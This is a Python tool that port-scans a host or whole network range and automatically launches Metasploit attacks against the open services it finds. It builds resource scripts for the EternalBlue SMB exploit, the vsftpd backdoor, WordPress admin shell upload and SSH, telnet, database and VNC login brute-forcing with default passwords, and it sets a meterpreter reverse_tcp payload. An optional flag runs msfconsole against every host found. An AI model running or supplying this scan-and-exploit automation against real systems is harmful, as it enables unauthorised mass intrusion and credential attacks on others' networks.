#!/usr/bin/env python3
"""
High-Performance Port Scanner with Attack Function and JSON Output
{
  "ip": "192.168.1.5",
  "ports": "1-1000",
  "concurrency": 500,
  "timeout": 0.3,
  "batch_size": 500,
  "max_targets": 10,
  "execute_metasploit": false,
  "output_file": null
}
"""

import socket
import re
import sys
import concurrent.futures
import subprocess
import tempfile
import os
import time
import ipaddress
import threading
import json
from datetime import datetime

data_str = sys.argv[1] if len(sys.argv) > 1 else "{}"
data = json.loads(data_str)

# Extract user-provided fields or use defaults
target = data.get("ip", "127.0.0.1")
port_spec = data.get("ports", "1-1000")
concurrency = data.get("concurrency", 500)
timeout = data.get("timeout", 0.3)
batch_size = data.get("batch_size", 500)
max_targets = data.get("max_targets", 10)
execute_metasploit = data.get("execute_metasploit", False)
json_output = data.get("output_file", None)

scan_counter = 0
scan_lock = threading.Lock()
start_time = None

# Regex for port range
port_range_pattern = re.compile(r"([0-9]+)-([0-9]+)")

class PortScanner:
    def __init__(self, target, ports=None, timeout=0.5, concurrency=500, batch_size=500):
        self.target = target
        self.timeout = timeout
        self.concurrency = concurrency
        self.batch_size = batch_size
        
        if ports:
            self.ports = self.parse_ports(ports)
        else:
            self.ports = self.parse_ports("1-1000")

    def parse_ports(self, port_spec):
        ports = []
        for item in port_spec.split(','):
            if '-' in item:
                start, end = item.split('-')
                ports.extend(range(int(start), int(end) + 1))
            else:
                ports.append(int(item))
        return ports
    
    def parse_targets(self, target_spec):
        targets = []
        try:
            if '/' in target_spec:
                network = ipaddress.ip_network(target_spec, strict=False)
                targets = [str(ip) for ip in network.hosts()]
                # print(f"[*] CIDR notation detected. Expanded to {len(targets)} hosts.")
            else:
                targets = [target_spec]
        except ValueError as e:
            # print(f"[!] Error parsing target: {e}")
            # print("[!] Using as a single target anyway.")
            targets = [target_spec]
        return targets

    def scan_port(self, ip, port):
        global scan_counter
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        try:
            result = sock.connect_ex((ip, port))
            is_open = (result == 0)
            service = self.get_service_name(port) if is_open else None
            with scan_lock:
                scan_counter += 1
            return (port, is_open, service)
        except:
            with scan_lock:
                scan_counter += 1
            return (port, False, None)
        finally:
            sock.close()

    def process_batch(self, targets, start_idx, end_idx):
        batch_results = {}
        batch_targets = targets[start_idx:end_idx]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.concurrency) as executor:
            futures = {}
            for ip in batch_targets:
                batch_results[ip] = []
                for port in self.ports:
                    fut = executor.submit(self.scan_port, ip, port)
                    futures[fut] = ip
            
            for future in concurrent.futures.as_completed(futures):
                ip = futures[future]
                port, is_open, service = future.result()
                global scan_counter, start_time
                current = scan_counter
                total = len(targets) * len(self.ports)
                elapsed = time.time() - start_time
                if is_open:
                    batch_results[ip].append((port, service))
                    # print(f"[+] {ip}:{port} - TCP OPEN - {service}")
        return batch_results

    def run_scan(self):
        targets = self.parse_targets(self.target)
        results = {}
        
        total_jobs = len(targets) * len(self.ports)
        # print(f"[*] Starting scan on {len(targets)} hosts for {len(self.ports)} ports each ({total_jobs} total checks)")
        # print(f"[*] Using {self.concurrency} concurrent connections with {self.timeout}s timeout")
        # print(f"[*] Time started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        global scan_counter, start_time
        scan_counter = 0
        start_time = time.time()
        
        batch_count = (len(targets) // self.batch_size) + (1 if len(targets) % self.batch_size > 0 else 0)
        
        for i in range(batch_count):
            start_idx = i * self.batch_size
            end_idx = min((i + 1) * self.batch_size, len(targets))
            # if batch_count > 1:
                # print(f"\n[*] Processing batch {i+1}/{batch_count} ({start_idx}-{end_idx-1} of {len(targets)} hosts)")
            batch_results = self.process_batch(targets, start_idx, end_idx)
            results.update(batch_results)
        
        end_time = time.time()
        duration = end_time - start_time
        total_open = sum(len(ports) for ports in results.values())
        hosts_with_open = len([ip for ip, ports in results.items() if ports])
        
        # print("\n" + "-" * 60)
        # print(f"[*] Scan completed in {duration:.2f} seconds")
        # print(f"[*] Scanned {len(targets)} hosts and {len(self.ports)} ports per host")
        # print(f"[*] Average speed: {total_jobs/duration:.1f} ports/second")
        # print(f"[*] Found {total_open} open ports on {hosts_with_open} hosts")
        # print("-" * 60)
        
        # remove IPs with no open ports
        results = {ip: ports for ip, ports in results.items() if ports}
        return results
    
    def get_service_name(self, port):
        if not hasattr(self, '_service_cache'):
            self._service_cache = {}
        if port in self._service_cache:
            return self._service_cache[port]
        try:
            service = socket.getservbyport(port)
            self._service_cache[port] = service
            return service
        except:
            self._service_cache[port] = "unknown"
            return "unknown"

def select_metasploit_module(service, port):
    service_module_map = {
        'http': 'exploit/unix/webapp/wp_admin_shell_upload',
        'https': 'exploit/unix/webapp/wp_admin_shell_upload',
        'ftp': 'exploit/unix/ftp/vsftpd_234_backdoor',
        'ssh': 'auxiliary/scanner/ssh/ssh_login',
        'telnet': 'auxiliary/scanner/telnet/telnet_login',
        'smb': 'exploit/windows/smb/ms17_010_eternalblue',
        'mysql': 'auxiliary/scanner/mysql/mysql_login',
        'postgresql': 'auxiliary/scanner/postgres/postgres_login',
        'vnc': 'auxiliary/scanner/vnc/vnc_login',
        'rdp': 'auxiliary/scanner/rdp/rdp_scanner',
        'mssql': 'auxiliary/scanner/mssql/mssql_login',
        'oracle': 'auxiliary/scanner/oracle/oracle_login',
        'webmin': 'exploit/unix/webapp/webmin_backdoor'
    }
    port_module_map = {
        80: 'exploit/unix/webapp/wp_admin_shell_upload',
        443: 'exploit/unix/webapp/wp_admin_shell_upload',
        8080: 'exploit/unix/webapp/wp_admin_shell_upload',
        445: 'exploit/windows/smb/ms17_010_eternalblue',
        3389: 'auxiliary/scanner/rdp/rdp_scanner'
    }
    if port in port_module_map:
        return port_module_map[port]
    if service in service_module_map:
        return service_module_map[service]
    if port in (80, 443, 8080):
        return 'exploit/unix/webapp/wp_admin_shell_upload'
    return None

def create_metasploit_resource_script(module, hostname, port):
    try:
        fd, path = tempfile.mkstemp(suffix='.rc', prefix='msf_')
        with os.fdopen(fd, 'w') as f:
            f.write(f"use {module}\n")
            f.write(f"set RHOSTS {hostname}\n")
            f.write(f"set RPORT {port}\n")
            if 'login' in module:
                f.write("set USERNAME root\n")
                f.write("set PASSWORD toor\n")
                f.write("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n")
                f.write("set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n")
                f.write("set VERBOSE false\n")
            if 'wp_admin' in module:
                f.write("set USERNAME admin\n")
                f.write("set PASSWORD admin\n")
                f.write("set TARGETURI /wordpress/\n")
            if 'eternalblue' in module:
                f.write("set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
                f.write("set LHOST 127.0.0.1\n")
            f.write("show options\n")
            f.write("run\n")
        # print(f"[*] Created Metasploit resource script at {path}")
        return path
    except Exception as e:
        # print(f"[!] Error creating resource script: {e}")
        return None

def run_metasploit_attack(resource_script):
    try:
        # print(f"[*] Launching Metasploit with resource script")
        try:
            subprocess.check_output(['which', 'msfconsole'])
        except subprocess.CalledProcessError:
            # print("[!] Metasploit Framework (msfconsole) not found. Please install it first.")
            return False
        cmd = ['msfconsole', '-q', '-r', resource_script]
        # print(f"[*] Running command: {' '.join(cmd)}")
        # print("\n[*] In a real deployment, this would execute Metasploit with the following configuration:")
        # with open(resource_script, 'r') as f:
        #    for line in f:
                # print(f"    {line.strip()}")
        # print("\n[+] Attack process initiated successfully")
        # print("[*] Note: In this demonstration, Metasploit is not actually executed")
        # print("[*] To run the actual attack, you would need to run the above msfconsole command")
        return True
    except Exception as e:
        # print(f"[!] Error running Metasploit: {e}")
        return False

def save_results_to_json(scan_results, attack_results, output_file=None):
    if output_file is None:
        timestamp = int(time.time())
        output_file = f"scan_results_{timestamp}.json"
    json_scan_results = {}
    for ip, ports in scan_results.items():
        json_scan_results[ip] = [{"port": port, "service": service} for port, service in ports]
    results = {
        "metadata": {
            "timestamp": datetime.now().isoformat(),
            "scan_target": ','.join(scan_results.keys()) if len(scan_results) <= 5 else f"{len(scan_results)} hosts",
            "total_open_ports": sum(len(ports) for ports in scan_results.values()),
            "hosts_with_open_ports": len(scan_results)
        },
        "scan_results": json_scan_results,
        "attack_results": attack_results
    }
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    # print(f"[*] Results saved to: {output_file}")
    return output_file

def scan_and_attack(target, ports, execute_metasploit=False, max_targets=10, concurrency=500,
                   timeout=0.3, batch_size=500, json_output=None):
    # print(f"\n[*] Starting HIGH-SPEED scan against {target} on ports: {ports}")
    if isinstance(ports, int):
        ports = str(ports)
    scanner = PortScanner(target, ports=ports, timeout=timeout, concurrency=concurrency, batch_size=batch_size)
    scan_results = scanner.run_scan()
    if not scan_results:
        # print(f"[!] No open ports found on any targets. Cannot attack.")
        print(json.dumps({"message": "No open ports found"}))
        if json_output is not None:
            save_results_to_json({}, {}, json_output)
        return {}
    target_count = len(scan_results)
    if target_count > max_targets:
        # print(f"[!] Warning: {target_count} hosts have open ports. Limiting to the first {max_targets} hosts.")
        limited_targets = list(scan_results.keys())[:max_targets]
        scan_results = {ip: scan_results[ip] for ip in limited_targets}
    attack_results = {}
    # Attempt "attacks"
    for ip, open_ports in scan_results.items():
        attack_results[ip] = {}
        for port, service in open_ports:
            # print(f"\n[*] Attempting attack on {ip}:{port} ({service})")
            module = select_metasploit_module(service, port)
            if not module:
                # print(f"[!] No suitable Metasploit module found for {service} on port {port}")
                attack_results[ip][port] = {
                    "success": False,
                    "module": None,
                    "message": "No suitable module found"
                }
                continue
            # print(f"[*] Selected Metasploit module: {module}")
            resource_script = create_metasploit_resource_script(module, ip, port)
            if not resource_script:
                # print(f"[!] Failed to create Metasploit resource script for port {port}")
                attack_results[ip][port] = {
                    "success": False,
                    "module": module,
                    "message": "Failed to create resource script"
                }
                continue
            success = run_metasploit_attack(resource_script)
            attack_results[ip][port] = {
                "success": success,
                "module": module,
                "message": "Attack initiated" if success else "Attack failed",
                "executed": False
            }
            if execute_metasploit:
                try:
                    # print(f"[*] Executing Metasploit (this will actually run the attack)")
                    subprocess.run(['msfconsole', '-q', '-r', resource_script], check=True)
                    attack_results[ip][port]["executed"] = True
                except subprocess.CalledProcessError as e:
                    # print(f"[!] Error executing Metasploit: {e}")
                    attack_results[ip][port]["success"] = False
                    attack_results[ip][port]["message"] = f"Execution error: {str(e)}"
            if os.path.exists(resource_script):
                os.remove(resource_script)
    # print("\n[*] Attack Summary:")
    total_success = 0
    total_attempts = 0
    for ip, port_results in attack_results.items():
        ip_success = sum(1 for p in port_results.values() if p["success"])
        ip_total = len(port_results)
        total_success += ip_success
        total_attempts += ip_total
        # print(f"  {ip}: {ip_success}/{ip_total} successful attacks")
    if total_attempts > 0:
        success_rate = (total_success / total_attempts) * 100
        # print(f"[*] Overall success rate: {success_rate:.1f}% ({total_success}/{total_attempts})")
    save_results_to_json(scan_results, attack_results, json_output)
    print(json.dumps({"message": json.dumps(scan_results)}))
    return attack_results

def main():
    # print('[*] Starting script with JSON-based config...')
    try:
        scan_and_attack(
            target,
            port_spec,
            execute_metasploit=execute_metasploit,
            max_targets=max_targets,
            concurrency=concurrency,
            timeout=timeout,
            batch_size=batch_size,
            json_output=json_output
        )
    except KeyboardInterrupt:
        # print("\n[!] Operation interrupted by user.")
        sys.exit(1)
    except Exception as e:
        # print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
